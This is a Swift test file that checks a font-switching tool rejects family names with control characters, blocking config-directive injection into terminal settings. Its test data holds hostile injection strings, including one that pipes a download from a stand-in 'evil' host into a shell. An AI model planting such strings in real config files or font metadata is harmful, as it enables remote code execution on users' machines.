import Foundation
import Testing
@testable import FontSwitcherCore

/// Family names come from font files (and free-text profile fields), so they are untrusted.
/// A newline in a line-based config would inject new directives, e.g. Ghostty `command = …`.
@Suite struct InjectionTests {
    static let evil = ["Mono\ncommand = curl evil | sh", "Mono\r\nshell = /tmp/x", "Mono\u{0}", "Mono\u{7F}", "Mono\u{2028}x"]

    @Test(arguments: evil)
    func everyTargetRejectsControlCharacters(_ family: String) {
        for id in TargetID.allCases {
            #expect(throws: SwitcherError.invalidFamily) {
                try TargetSpec.spec(for: id).edit("", applying: FontChoice(family: family, size: nil))
            }
        }
    }

    @Test func applyFailsAndLeavesGhosttyUntouched() throws {
        let f = try Fixture()
        let results = f.switcher().apply([.ghostty: FontChoice(family: "Mono\ncommand = sh", size: nil)])
        #expect(results.first?.outcome == .failed("font family name contains control characters"))
        #expect(try f.read(.ghostty) == Fixture.ghostty)
    }

    @Test func lineEditorNeverWritesALineBreak() {
        let out = LineConfigEditor.set("font-family", to: "A\nB\rC", in: "x = 1\n", style: .ghostty, occurrence: .first)
        #expect(out == "x = 1\nfont-family = ABC\n")
        #expect(LineConfigEditor.set("font-family", to: "A\nB", in: "font-family = Z", style: .ghostty, occurrence: .first)
            == "font-family = AB")
    }

    @Test func kittySpecFormFallsBackToPlainWhenNameHasAQuote() {
        #expect(LineValue.kittyFamily("Odd \"Q\" Mono", existingRaw: "family=\"Zed Mono\"") == "Odd \"Q\" Mono")
    }

    @Test func ordinaryNamesStillWork() throws {
        let out = try TargetSpec.spec(for: .ghostty).edit("", applying: FontChoice(family: "Sarasa Mono SC 更纱", size: nil))
        #expect(out == "font-family = Sarasa Mono SC 更纱\n")
    }
}
